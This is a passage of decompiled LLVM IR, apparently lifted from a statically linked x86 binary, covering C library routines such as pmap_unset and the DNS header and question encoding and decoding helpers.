dec_label_pc_80676c3:                             ; preds = %dec_label_pc_80676b7
  %v1_80676c3 = add i32 %v0_80676fe.pre, 16
  %v2_80676c3 = inttoptr i32 %v1_80676c3 to i16*
  %v3_80676c3 = load i16, i16* %v2_80676c3, align 2
  %v12_80676c3 = icmp eq i16 %v3_80676c3, 2
  %v1_80676c8 = icmp eq i1 %v12_80676c3, false
  br i1 %v1_80676c8, label %dec_label_pc_80676fe, label %dec_label_pc_80676ca

dec_label_pc_80676ca:                             ; preds = %dec_label_pc_80676c3
  br i1 %v1_80676cc, label %dec_label_pc_80676d5, label %dec_label_pc_80676ce

dec_label_pc_80676ce:                             ; preds = %dec_label_pc_80676ca
  br i1 %v1_80676d3, label %dec_label_pc_80676fe, label %dec_label_pc_80676d5

dec_label_pc_80676d5:                             ; preds = %dec_label_pc_80676ce, %dec_label_pc_80676ca
  %tmp36 = inttoptr i32 %v0_8067602 to i16*
  %v5_80676e0 = call i32 @memcpy(i16* %tmp36, i32 %v1_80676c3, i32 16)
  %v1_80676e9 = add i32 %v0_8067602, 2
  %v2_80676e9 = inttoptr i32 %v1_80676e9 to i16*
  store i16 28416, i16* %v2_80676e9, align 2
  %v0_80676ef = load i32, i32* @ebp, align 4
  %v2_80676f2 = call i32 @__libc_close(i32 %v0_80676ef)
  br label %dec_label_pc_806772b

dec_label_pc_80676fe:                             ; preds = %dec_label_pc_80676b7, %dec_label_pc_80676ce, %dec_label_pc_80676c3
  %v1_80676fe = add i32 %v0_80676fe.pre, 32
  store i32 %v1_80676fe, i32* @esi, align 4
  %v0_8067701 = load i32, i32* @edi, align 4
  %v1_8067701 = add i32 %v0_8067701, -32
  %v6_8067701 = icmp eq i32 %v1_8067701, 0
  store i32 %v1_8067701, i32* @edi, align 4
  %v1_8067706 = icmp eq i1 %v6_8067701, false
  br i1 %v1_8067706, label %dec_label_pc_8067686, label %dec_label_pc_806770c

dec_label_pc_806770c:                             ; preds = %dec_label_pc_80676fe, %dec_label_pc_8067676
  %v12_806770c = icmp eq i32 %stack_var_-4164.1, 1
  %v1_8067711 = icmp eq i1 %v12_806770c, false
  br i1 %v1_8067711, label %dec_label_pc_8067720, label %dec_label_pc_8067676

dec_label_pc_8067720:                             ; preds = %dec_label_pc_806770c
  %v0_8067723 = load i32, i32* @ebp, align 4
  %v2_8067724 = call i32 @__libc_close(i32 %v0_8067723)
  br label %dec_label_pc_806772b

dec_label_pc_806772b:                             ; preds = %dec_label_pc_80676d5, %dec_label_pc_8067720
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8067720 ], [ 1, %dec_label_pc_80676d5 ]
  %v2_8067731 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8067731, i32* @ebx, align 4
  store i32 %v0_80675fa, i32* @esi, align 4
  store i32 %v0_80675f9, i32* @edi, align 4
  store i32 %v0_80675f8, i32* @ebp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_80676fe, { 1, 0 }
  uselistorder i32 %stack_var_-4164.1, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 5, 11, 10, 9, 3, 2, 4 }
  uselistorder i16 28416, { 1, 0 }
  uselistorder i16 2, { 0, 6, 1, 2, 3, 4, 8, 5, 7 }
  uselistorder i32 (i32)* @__GI_exit, { 1, 0, 2 }
  uselistorder i32 (i8*)* @perror, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 3, 0, 5, 4 }
  uselistorder i32 4096, { 5, 0, 8, 1, 7, 3, 6, 2, 4 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_806772b, { 1, 0 }
  uselistorder label %dec_label_pc_80676fe, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8067686, { 1, 0 }
  uselistorder label %dec_label_pc_8067676, { 1, 0 }
  uselistorder label %dec_label_pc_8067665, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8067736 = load i32, i32* @ebx, align 4
  %v2_806773a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_806773a, i32* @ebx, align 4
  store i32 %v2_806773a, i32* @eax, align 4
  store i32 -1, i32* %stack_var_-8, align 4
  %v2_8067748 = call i32 @__get_myaddress(i32 -1, i32 %v0_8067736)
  %v1_806774d = icmp eq i32 %v2_8067748, 0
  br i1 %v1_806774d, label %entry.dec_label_pc_80677e1_crit_edge, label %dec_label_pc_8067755

entry.dec_label_pc_80677e1_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80677e1

dec_label_pc_8067755:                             ; preds = %entry
  %v2_806775f = ptrtoint i32* %stack_var_-8 to i32
  %v9_8067778 = call i32 @__GI_clntudp_bufcreate(i32 %v2_806773a, i32 100000, i32 2, i32 5, i32* null, i32 %v2_806775f, i32 400, i32 400)
  %v1_8067780 = icmp eq i32 %v9_8067778, 0
  store i32 %v9_8067778, i32* %ebx.global-to-local, align 4
  br i1 %v1_8067780, label %dec_label_pc_80677e1, label %dec_label_pc_8067786

dec_label_pc_8067786:                             ; preds = %dec_label_pc_8067755
  %v1_80677ae = add i32 %v9_8067778, 4
  %v2_80677ae = inttoptr i32 %v1_80677ae to i32*
  %v3_80677ae = load i32, i32* %v2_80677ae, align 4
  store i32 %v3_80677ae, i32* @ecx, align 4
  %v5_80677cc = inttoptr i32 %v3_80677ae to i32*
  %v6_80677cc = load i32, i32* %v5_80677cc, align 4
  call void @__pseudo_call(i32 %v6_80677cc)
  %v0_80677ce = load i32, i32* %ebx.global-to-local, align 4
  %v1_80677ce = add i32 %v0_80677ce, 4
  %v2_80677ce = inttoptr i32 %v1_80677ce to i32*
  %v3_80677ce = load i32, i32* %v2_80677ce, align 4
  %v5_80677d5 = add i32 %v3_80677ce, 16
  %v6_80677d5 = inttoptr i32 %v5_80677d5 to i32*
  %v7_80677d5 = load i32, i32* %v6_80677d5, align 4
  call void @__pseudo_call(i32 %v7_80677d5)
  %v2_80677e6.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80677e3

dec_label_pc_80677e1:                             ; preds = %entry.dec_label_pc_80677e1_crit_edge, %dec_label_pc_8067755
  br label %dec_label_pc_80677e3

dec_label_pc_80677e3:                             ; preds = %dec_label_pc_8067786, %dec_label_pc_80677e1
  %v2_80677e6 = phi i32 [ %v2_80677e6.pre, %dec_label_pc_8067786 ], [ %tmp12, %dec_label_pc_80677e1 ]
  %v0_80677e7 = phi i32 [ %tmp, %dec_label_pc_8067786 ], [ 0, %dec_label_pc_80677e1 ]
  store i32 %v2_80677e6, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80677e7

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder void (i32)* @__pseudo_call, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 18, 17, 19, 16, 20, 21, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32*, i32, i32, i32)* @__GI_clntudp_bufcreate, { 1, 0 }
  uselistorder i32* null, { 1, 2, 6, 3, 4, 7, 8, 5, 9, 10, 0, 11, 12, 13 }
  uselistorder i32 100000, { 1, 0 }
  uselistorder label %dec_label_pc_80677e3, { 1, 0 }
  uselistorder label %dec_label_pc_80677e1, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8067a2c = load i32, i32* @ebx, align 4
  store i32 %v0_8067a2c, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_8067a36 = ptrtoint i8* %tmp to i32
  store i32 %v4_8067a36, i32* %esi.global-to-local, align 4
  %v7_8067a3a = icmp sgt i32 %tmp9, 11
  br i1 %v7_8067a3a, label %dec_label_pc_8067a40, label %dec_label_pc_8067ad4

dec_label_pc_8067a40:                             ; preds = %entry
  %v1_8067a40 = add i32 %tmp8, 1
  %v2_8067a40 = inttoptr i32 %v1_8067a40 to i8*
  %v3_8067a40 = load i8, i8* %v2_8067a40, align 1
  store i8 %v3_8067a40, i8* %tmp, align 1
  %v0_8067a46 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067a46 = inttoptr i32 %v0_8067a46 to i32*
  %v2_8067a46 = load i32, i32* %v1_8067a46, align 4
  %v1_8067a48 = trunc i32 %v2_8067a46 to i8
  %v2_8067a48 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067a48 = add i32 %v2_8067a48, 1
  %v4_8067a48 = inttoptr i32 %v3_8067a48 to i8*
  store i8 %v1_8067a48, i8* %v4_8067a48, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8067a6d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067a6d = add i32 %v0_8067a6d, 8
  %v2_8067a6d = inttoptr i32 %v1_8067a6d to i32*
  %v3_8067a6d = load i32, i32* %v2_8067a6d, align 4
  %v1_8067a70 = mul i32 %v3_8067a6d, 8
  %v2_8067a73 = and i32 %v1_8067a70, 120
  %v2_8067a76 = or i32 %v2_8067a73, 4
  store i32 %v2_8067a76, i32* %edx.global-to-local, align 4
  %v1_8067a78 = add i32 %v0_8067a6d, 20
  %v2_8067a78 = inttoptr i32 %v1_8067a78 to i32*
  %v3_8067a78 = load i32, i32* %v2_8067a78, align 4
  %v4_8067a78 = icmp eq i32 %v3_8067a78, 0
  %v1_8067a7c = icmp eq i1 %v4_8067a78, false
  %v2_8067a7c = zext i1 %v1_8067a7c to i32
  %v2_8067a7f = or i32 %v2_8067a7c, %v2_8067a76
  store i32 %v2_8067a7f, i32* %edx.global-to-local, align 4
  %v2_8067a81 = or i32 %v2_8067a7f, 130
  %v3_8067a81 = trunc i32 %v2_8067a81 to i8
  store i32 %v2_8067a81, i32* @ecx, align 4
  %v2_8067a83 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067a83 = add i32 %v2_8067a83, 2
  %v4_8067a83 = inttoptr i32 %v3_8067a83 to i8*
  store i8 %v3_8067a81, i8* %v4_8067a83, align 1
  %v0_8067a86 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067a8a = add i32 %v0_8067a86, 28
  %v2_8067a8a = inttoptr i32 %v1_8067a8a to i8*
  %v3_8067a8a = load i8, i8* %v2_8067a8a, align 1
  %v5_8067a8a = load i32, i32* %edx.global-to-local, align 4
  %v2_8067a93 = urem i8 %v3_8067a8a, 16
  %v7_8067a93 = zext i8 %v2_8067a93 to i32
  %v9_8067a93 = and i32 %v5_8067a8a, -256
  %v10_8067a93 = or i32 %v9_8067a93, %v7_8067a93
  store i32 %v10_8067a93, i32* %edx.global-to-local, align 4
  %v2_8067a96 = or i8 %v2_8067a93, -128
  %v2_8067a98 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067a98 = add i32 %v2_8067a98, 3
  %v4_8067a98 = inttoptr i32 %v3_8067a98 to i8*
  store i8 %v2_8067a96, i8* %v4_8067a98, align 1
  %v0_8067a9b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067a9b = add i32 %v0_8067a9b, 33
  %v2_8067a9b = inttoptr i32 %v1_8067a9b to i8*
  %v3_8067a9b = load i8, i8* %v2_8067a9b, align 1
  %v2_8067a9f = load i32, i32* %esi.global-to-local, align 4
  %v3_8067a9f = add i32 %v2_8067a9f, 4
  %v4_8067a9f = inttoptr i32 %v3_8067a9f to i8*
  store i8 %v3_8067a9b, i8* %v4_8067a9f, align 1
  %v0_8067aa2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067aa2 = add i32 %v0_8067aa2, 32
  %v2_8067aa2 = inttoptr i32 %v1_8067aa2 to i32*
  %v3_8067aa2 = load i32, i32* %v2_8067aa2, align 4
  %v1_8067aa5 = trunc i32 %v3_8067aa2 to i8
  %v2_8067aa5 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067aa5 = add i32 %v2_8067aa5, 5
  %v4_8067aa5 = inttoptr i32 %v3_8067aa5 to i8*
  store i8 %v1_8067aa5, i8* %v4_8067aa5, align 1
  %v0_8067aa8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067aa8 = add i32 %v0_8067aa8, 37
  %v2_8067aa8 = inttoptr i32 %v1_8067aa8 to i8*
  %v3_8067aa8 = load i8, i8* %v2_8067aa8, align 1
  %v2_8067aac = load i32, i32* %esi.global-to-local, align 4
  %v3_8067aac = add i32 %v2_8067aac, 6
  %v4_8067aac = inttoptr i32 %v3_8067aac to i8*
  store i8 %v3_8067aa8, i8* %v4_8067aac, align 1
  %v0_8067aaf = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067aaf = add i32 %v0_8067aaf, 36
  %v2_8067aaf = inttoptr i32 %v1_8067aaf to i32*
  %v3_8067aaf = load i32, i32* %v2_8067aaf, align 4
  %v1_8067ab2 = trunc i32 %v3_8067aaf to i8
  %v2_8067ab2 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067ab2 = add i32 %v2_8067ab2, 7
  %v4_8067ab2 = inttoptr i32 %v3_8067ab2 to i8*
  store i8 %v1_8067ab2, i8* %v4_8067ab2, align 1
  %v0_8067ab5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067ab5 = add i32 %v0_8067ab5, 41
  %v2_8067ab5 = inttoptr i32 %v1_8067ab5 to i8*
  %v3_8067ab5 = load i8, i8* %v2_8067ab5, align 1
  %v2_8067ab9 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067ab9 = add i32 %v2_8067ab9, 8
  %v4_8067ab9 = inttoptr i32 %v3_8067ab9 to i8*
  store i8 %v3_8067ab5, i8* %v4_8067ab9, align 1
  %v0_8067abc = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067abc = add i32 %v0_8067abc, 40
  %v2_8067abc = inttoptr i32 %v1_8067abc to i32*
  %v3_8067abc = load i32, i32* %v2_8067abc, align 4
  %v1_8067abf = trunc i32 %v3_8067abc to i8
  %v2_8067abf = load i32, i32* %esi.global-to-local, align 4
  %v3_8067abf = add i32 %v2_8067abf, 9
  %v4_8067abf = inttoptr i32 %v3_8067abf to i8*
  store i8 %v1_8067abf, i8* %v4_8067abf, align 1
  %v0_8067ac2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067ac2 = add i32 %v0_8067ac2, 45
  %v2_8067ac2 = inttoptr i32 %v1_8067ac2 to i8*
  %v3_8067ac2 = load i8, i8* %v2_8067ac2, align 1
  %v2_8067ac6 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067ac6 = add i32 %v2_8067ac6, 10
  %v4_8067ac6 = inttoptr i32 %v3_8067ac6 to i8*
  store i8 %v3_8067ac2, i8* %v4_8067ac6, align 1
  %v0_8067ac9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067ac9 = add i32 %v0_8067ac9, 44
  %v2_8067ac9 = inttoptr i32 %v1_8067ac9 to i32*
  %v3_8067ac9 = load i32, i32* %v2_8067ac9, align 4
  %v1_8067acc = trunc i32 %v3_8067ac9 to i8
  %v2_8067acc = load i32, i32* %esi.global-to-local, align 4
  %v3_8067acc = add i32 %v2_8067acc, 11
  %v4_8067acc = inttoptr i32 %v3_8067acc to i8*
  store i8 %v1_8067acc, i8* %v4_8067acc, align 1
  %v2_8067ad4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8067ad4

dec_label_pc_8067ad4:                             ; preds = %entry, %dec_label_pc_8067a40
  %v2_8067ad4 = phi i32 [ %v0_8067a2c, %entry ], [ %v2_8067ad4.pre, %dec_label_pc_8067a40 ]
  %v0_8067ad6 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8067a40 ]
  store i32 %v2_8067ad4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8067ad6

; uselistorder directives
  uselistorder i32 45, { 3, 1, 2, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 1, 0, 2 }
  uselistorder i32 33, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8067ad4, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_8067ad8 = load i32, i32* @ebx, align 4
  store i32 %v0_8067ad8, i32* %stack_var_-4, align 4
  %v4_8067ad9 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8067ad9, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8067ae1 = load i8, i8* %tmp2, align 1
  %v3_8067ae1 = zext i8 %v2_8067ae1 to i32
  %v1_8067ae4 = add i32 %v4_8067ad9, 1
  %v2_8067ae4 = inttoptr i32 %v1_8067ae4 to i8*
  %v3_8067ae4 = load i8, i8* %v2_8067ae4, align 1
  %v4_8067ae4 = zext i8 %v3_8067ae4 to i32
  %v2_8067ae8 = mul nuw nsw i32 %v3_8067ae1, 256
  %v2_8067aeb = or i32 %v4_8067ae4, %v2_8067ae8
  %v2_8067aed = inttoptr i32 %tmp to i32*
  store i32 %v2_8067aeb, i32* %v2_8067aed, align 4
  %v0_8067aef = load i32, i32* @ecx, align 4
  %v1_8067aef = add i32 %v0_8067aef, 2
  %v2_8067aef = inttoptr i32 %v1_8067aef to i8*
  %v3_8067aef = load i8, i8* %v2_8067aef, align 1
  %tmp6 = icmp slt i8 %v3_8067aef, 0
  %v2_8067af3 = zext i1 %tmp6 to i32
  %v1_8067af6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067af6 = add i32 %v1_8067af6, 4
  %v3_8067af6 = inttoptr i32 %v2_8067af6 to i32*
  store i32 %v2_8067af3, i32* %v3_8067af6, align 4
  %v0_8067af9 = load i32, i32* @ecx, align 4
  %v1_8067af9 = add i32 %v0_8067af9, 2
  %v2_8067af9 = inttoptr i32 %v1_8067af9 to i8*
  %v3_8067af9 = load i8, i8* %v2_8067af9, align 1
  %v3_8067afc = udiv i8 %v3_8067af9, 8
  %tmp7 = urem i8 %v3_8067afc, 16
  %v1_8067aff = zext i8 %tmp7 to i32
  %v1_8067b02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b02 = add i32 %v1_8067b02, 8
  %v3_8067b02 = inttoptr i32 %v2_8067b02 to i32*
  store i32 %v1_8067aff, i32* %v3_8067b02, align 4
  %v0_8067b05 = load i32, i32* @ecx, align 4
  %v1_8067b05 = add i32 %v0_8067b05, 2
  %v2_8067b05 = inttoptr i32 %v1_8067b05 to i8*
  %v3_8067b05 = load i8, i8* %v2_8067b05, align 1
  %div = udiv i8 %v3_8067b05, 4
  %tmp8 = urem i8 %div, 2
  %v1_8067b0c = zext i8 %tmp8 to i32
  %v1_8067b0f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b0f = add i32 %v1_8067b0f, 12
  %v3_8067b0f = inttoptr i32 %v2_8067b0f to i32*
  store i32 %v1_8067b0c, i32* %v3_8067b0f, align 4
  %v0_8067b12 = load i32, i32* @ecx, align 4
  %v1_8067b12 = add i32 %v0_8067b12, 2
  %v2_8067b12 = inttoptr i32 %v1_8067b12 to i8*
  %v3_8067b12 = load i8, i8* %v2_8067b12, align 1
  %div5 = udiv i8 %v3_8067b12, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8067b18 = zext i8 %tmp9 to i32
  %v1_8067b1b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b1b = add i32 %v1_8067b1b, 16
  %v3_8067b1b = inttoptr i32 %v2_8067b1b to i32*
  store i32 %v1_8067b18, i32* %v3_8067b1b, align 4
  %v0_8067b1e = load i32, i32* @ecx, align 4
  %v1_8067b1e = add i32 %v0_8067b1e, 2
  %v2_8067b1e = inttoptr i32 %v1_8067b1e to i8*
  %v3_8067b1e = load i8, i8* %v2_8067b1e, align 1
  %tmp10 = urem i8 %v3_8067b1e, 2
  %v1_8067b22 = zext i8 %tmp10 to i32
  %v1_8067b25 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b25 = add i32 %v1_8067b25, 20
  %v3_8067b25 = inttoptr i32 %v2_8067b25 to i32*
  store i32 %v1_8067b22, i32* %v3_8067b25, align 4
  %v0_8067b28 = load i32, i32* @ecx, align 4
  %v1_8067b28 = add i32 %v0_8067b28, 3
  %v2_8067b28 = inttoptr i32 %v1_8067b28 to i8*
  %v3_8067b28 = load i8, i8* %v2_8067b28, align 1
  %tmp11 = icmp slt i8 %v3_8067b28, 0
  %v2_8067b2c = zext i1 %tmp11 to i32
  %v1_8067b2f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b2f = add i32 %v1_8067b2f, 24
  %v3_8067b2f = inttoptr i32 %v2_8067b2f to i32*
  store i32 %v2_8067b2c, i32* %v3_8067b2f, align 4
  %v0_8067b32 = load i32, i32* @ecx, align 4
  %v1_8067b32 = add i32 %v0_8067b32, 3
  %v2_8067b32 = inttoptr i32 %v1_8067b32 to i8*
  %v3_8067b32 = load i8, i8* %v2_8067b32, align 1
  %tmp12 = urem i8 %v3_8067b32, 16
  %v1_8067b36 = zext i8 %tmp12 to i32
  %v1_8067b39 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b39 = add i32 %v1_8067b39, 28
  %v3_8067b39 = inttoptr i32 %v2_8067b39 to i32*
  store i32 %v1_8067b36, i32* %v3_8067b39, align 4
  %v0_8067b3c = load i32, i32* @ecx, align 4
  %v1_8067b3c = add i32 %v0_8067b3c, 4
  %v2_8067b3c = inttoptr i32 %v1_8067b3c to i8*
  %v3_8067b3c = load i8, i8* %v2_8067b3c, align 1
  %v4_8067b3c = zext i8 %v3_8067b3c to i32
  %v1_8067b40 = add i32 %v0_8067b3c, 5
  %v2_8067b40 = inttoptr i32 %v1_8067b40 to i8*
  %v3_8067b40 = load i8, i8* %v2_8067b40, align 1
  %v4_8067b40 = zext i8 %v3_8067b40 to i32
  %v2_8067b44 = mul nuw nsw i32 %v4_8067b3c, 256
  %v2_8067b47 = or i32 %v4_8067b40, %v2_8067b44
  %v1_8067b49 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b49 = add i32 %v1_8067b49, 32
  %v3_8067b49 = inttoptr i32 %v2_8067b49 to i32*
  store i32 %v2_8067b47, i32* %v3_8067b49, align 4
  %v0_8067b4c = load i32, i32* @ecx, align 4
  %v1_8067b4c = add i32 %v0_8067b4c, 6
  %v2_8067b4c = inttoptr i32 %v1_8067b4c to i8*
  %v3_8067b4c = load i8, i8* %v2_8067b4c, align 1
  %v4_8067b4c = zext i8 %v3_8067b4c to i32
  %v1_8067b50 = add i32 %v0_8067b4c, 7
  %v2_8067b50 = inttoptr i32 %v1_8067b50 to i8*
  %v3_8067b50 = load i8, i8* %v2_8067b50, align 1
  %v4_8067b50 = zext i8 %v3_8067b50 to i32
  %v2_8067b54 = mul nuw nsw i32 %v4_8067b4c, 256
  %v2_8067b57 = or i32 %v4_8067b50, %v2_8067b54
  %v1_8067b59 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b59 = add i32 %v1_8067b59, 36
  %v3_8067b59 = inttoptr i32 %v2_8067b59 to i32*
  store i32 %v2_8067b57, i32* %v3_8067b59, align 4
  %v0_8067b5c = load i32, i32* @ecx, align 4
  %v1_8067b5c = add i32 %v0_8067b5c, 8
  %v2_8067b5c = inttoptr i32 %v1_8067b5c to i8*
  %v3_8067b5c = load i8, i8* %v2_8067b5c, align 1
  %v4_8067b5c = zext i8 %v3_8067b5c to i32
  %v1_8067b60 = add i32 %v0_8067b5c, 9
  %v2_8067b60 = inttoptr i32 %v1_8067b60 to i8*
  %v3_8067b60 = load i8, i8* %v2_8067b60, align 1
  %v4_8067b60 = zext i8 %v3_8067b60 to i32
  %v2_8067b64 = mul nuw nsw i32 %v4_8067b5c, 256
  %v2_8067b67 = or i32 %v4_8067b60, %v2_8067b64
  %v1_8067b69 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b69 = add i32 %v1_8067b69, 40
  %v3_8067b69 = inttoptr i32 %v2_8067b69 to i32*
  store i32 %v2_8067b67, i32* %v3_8067b69, align 4
  %v0_8067b6c = load i32, i32* @ecx, align 4
  %v1_8067b6c = add i32 %v0_8067b6c, 10
  %v2_8067b6c = inttoptr i32 %v1_8067b6c to i8*
  %v3_8067b6c = load i8, i8* %v2_8067b6c, align 1
  %v4_8067b6c = zext i8 %v3_8067b6c to i32
  %v1_8067b70 = add i32 %v0_8067b6c, 11
  %v2_8067b70 = inttoptr i32 %v1_8067b70 to i8*
  %v3_8067b70 = load i8, i8* %v2_8067b70, align 1
  %v4_8067b70 = zext i8 %v3_8067b70 to i32
  %v2_8067b74 = mul nuw nsw i32 %v4_8067b6c, 256
  %v2_8067b77 = or i32 %v4_8067b70, %v2_8067b74
  %v1_8067b79 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b79 = add i32 %v1_8067b79, 44
  %v3_8067b79 = inttoptr i32 %v2_8067b79 to i32*
  store i32 %v2_8067b77, i32* %v3_8067b79, align 4
  %v2_8067b81 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8067b81, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 8, 9, 2, 3, 1, 6, 5, 15, 10, 11, 12, 13, 4, 14, 0, 7 }
  uselistorder i32 40, { 3, 4, 8, 10, 6, 7, 9, 5, 1, 0, 2, 11, 12, 13, 14 }
  uselistorder i32 7, { 5, 6, 3, 0, 1, 4, 7, 8, 9, 10, 11, 2 }
  uselistorder i32 6, { 10, 11, 5, 12, 1, 9, 6, 7, 4, 14, 13, 2, 3, 0, 8 }
  uselistorder i32 28, { 9, 10, 24, 26, 19, 12, 13, 0, 14, 15, 16, 17, 18, 3, 4, 5, 1, 25, 27, 11, 7, 8, 6, 35, 20, 21, 22, 28, 29, 30, 31, 32, 33, 2, 34, 38, 23, 36, 37, 39, 40, 41, 42 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 14, 6, 0, 17, 18, 7, 8, 9, 10, 11, 15, 16, 12, 13 }
  uselistorder i8 8, { 0, 4, 3, 2, 5, 1, 6, 7 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8067b84 = load i32, i32* @edi, align 4
  %v0_8067b85 = load i32, i32* @esi, align 4
  %v0_8067b86 = load i32, i32* @ebx, align 4
  store i32 %v0_8067b86, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_8067b93 = load i32, i32* @eax, align 4
  %v1_8067b96 = inttoptr i32 %tmp to i32*
  %v2_8067b96 = load i32, i32* %v1_8067b96, align 4
  %v7_8067b98 = inttoptr i32 %v2_8067b96 to i8*
  %v8_8067b98 = call i32 @__encode_dotted(i8* %v7_8067b98, i32 %tmp2, i32 %tmp3, i32 %v0_8067b93, i32 %v0_8067b86, i32 %v0_8067b85, i32 %v0_8067b84)
  %v2_8067ba0 = icmp slt i32 %v8_8067b98, 0
  store i32 %v8_8067b98, i32* @ecx, align 4
  br i1 %v2_8067ba0, label %dec_label_pc_8067bd1, label %dec_label_pc_8067ba6

dec_label_pc_8067ba6:                             ; preds = %entry
  %v0_8067ba6 = load i32, i32* @ebx, align 4
  %v2_8067ba6 = sub i32 %v0_8067ba6, %v8_8067b98
  %v1_8067ba8 = add i32 %v2_8067ba6, -3
  %v6_8067ba8 = sub i32 2, %v2_8067ba6
  %v7_8067ba8 = and i32 %v6_8067ba8, %v2_8067ba6
  %v8_8067ba8 = icmp slt i32 %v7_8067ba8, 0
  %v9_8067ba8 = icmp eq i32 %v1_8067ba8, 0
  %v10_8067ba8 = icmp slt i32 %v1_8067ba8, 0
  %v3_8067bab = icmp eq i1 %v10_8067ba8, %v8_8067ba8
  %v4_8067bab = icmp eq i1 %v9_8067ba8, false
  %v5_8067bab = and i1 %v4_8067bab, %v3_8067bab
  br i1 %v5_8067bab, label %dec_label_pc_8067bb2, label %dec_label_pc_8067bad

dec_label_pc_8067bad:                             ; preds = %dec_label_pc_8067ba6
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8067bd1

dec_label_pc_8067bb2:                             ; preds = %dec_label_pc_8067ba6
  %v0_8067bb2 = load i32, i32* @edi, align 4
  %v2_8067bb2 = add i32 %v0_8067bb2, %v8_8067b98
  store i32 %v2_8067bb2, i32* @edx, align 4
  %v0_8067bb5 = load i32, i32* @esi, align 4
  %v1_8067bb5 = add i32 %v0_8067bb5, 5
  %v2_8067bb5 = inttoptr i32 %v1_8067bb5 to i8*
  %v3_8067bb5 = load i8, i8* %v2_8067bb5, align 1
  %v1_8067bb9 = add i32 %v8_8067b98, 4
  store i32 %v1_8067bb9, i32* @ecx, align 4
  %v3_8067bbc = inttoptr i32 %v2_8067bb2 to i8*
